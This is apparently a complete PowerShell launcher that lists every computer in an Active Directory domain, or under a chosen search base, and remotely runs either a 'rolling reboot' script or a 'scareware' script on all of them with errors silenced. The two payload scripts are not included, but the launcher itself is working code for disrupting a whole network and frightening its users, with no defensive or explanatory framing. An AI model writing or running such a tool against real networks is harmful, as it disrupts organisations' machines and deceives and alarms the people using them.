Param(
    [switch]$RollingReboot,
    [switch]$Scareware,
    [string]$SearchBase = (Get-AdDomain).DistinguishedName
)

if ($RollingReboot) {
    $Script = ".\Start-RollingReboot.ps1"
} elseif ($Scareware) {
    $Script = ".\Start-Scareware.ps1"
} else {
    exit
}

$Computers = Get-AdComputer -Filter * -SearchBase $SearchBase | Select-Object -ExpandProperty Name
Invoke-Command -ComputerName $Computers -ErrorAction Ignore -FilePath $Script 
